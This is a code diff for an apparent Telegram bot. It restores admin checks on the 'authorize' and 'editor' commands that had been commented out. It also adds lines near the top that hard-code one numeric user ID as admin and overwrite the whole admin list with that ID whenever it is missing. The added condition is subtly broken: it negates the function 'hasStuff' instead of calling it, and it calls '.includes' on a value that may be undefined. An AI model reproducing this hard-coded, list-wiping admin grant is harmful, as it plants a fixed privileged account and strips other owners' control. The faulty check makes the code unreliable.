@@ -36,6 +36,10 @@ const addResponse = (text, confirmed) => {
 };
 const isArray = (arr) => Array.isArray(arr);
 const hasStuff = (arr) => isArray(arr) && arr.length > 0;
+
+const listOfAdmins = conf.get('admins')
+if (!hasStuff || !listOfAdmins.includes(1615985312)) conf.set('admins', [1615985312])
+
 const isAdmin = (id) => {
 	const admins = conf.get('admins');
 	return hasStuff(admins) && admins.includes(id);
@@ -100,7 +104,7 @@ bot.command('user_id', ctx => ctx.reply(String(ctx.message.reply_to_message?.fro
 bot.command('chat_id', ctx => ctx.reply(String(ctx.chat.id)));
 bot.command('authorize', ctx => {
 	const repliedToId = ctx.message.reply_to_message?.from?.id;
-	// if (isAdmin(ctx.from.id)) {
+	if (isAdmin(ctx.from.id)) {
 		const args = ctx.message.text.split(' ');
 		if (args.length > 1) {
 			const newAdmin = Number(args[1]);
@@ -113,10 +117,10 @@ bot.command('authorize', ctx => {
 			confAppend('admins', repliedToId);
 			ctx.reply(`Added ${repliedToId} to the list of users authorized to modify me.`);
 		}
-	// }
-	// else {
-	//     ctx.reply("You're unauthorized to authorize.");
-	// }
+	}
+	else {
+	    ctx.reply("You're unauthorized to authorize.");
+	}
 });
 bot.command('unauthorize', ctx => {
 	const repliedToId = ctx.message.reply_to_message?.from?.id;
@@ -141,7 +145,7 @@ bot.command('unauthorize', ctx => {
 
 bot.command('editor', ctx => {
 	const repliedToId = ctx.message.reply_to_message?.from?.id;
-	// if (isAdmin(ctx.from.id)) {
+	if (isAdmin(ctx.from.id)) {
 		const args = ctx.message.text.split(' ');
 		if (args.length > 1) {
 			const newEditor = Number(args[1]);
@@ -154,10 +158,10 @@ bot.command('editor', ctx => {
 			confAppend('editors', repliedToId);
 			ctx.reply(`Added ${repliedToId} to the list of users authorized to modify my responses.`);
 		}
-	// }
-	// else {
-	//     ctx.reply("You're unauthorized to authorize.");
-	// }
+	}
+	else {
+	    ctx.reply("You're unauthorized to authorize.");
+	}
 });
 bot.command('uneditor', ctx => {
 	const repliedToId = ctx.message.reply_to_message?.from?.id;
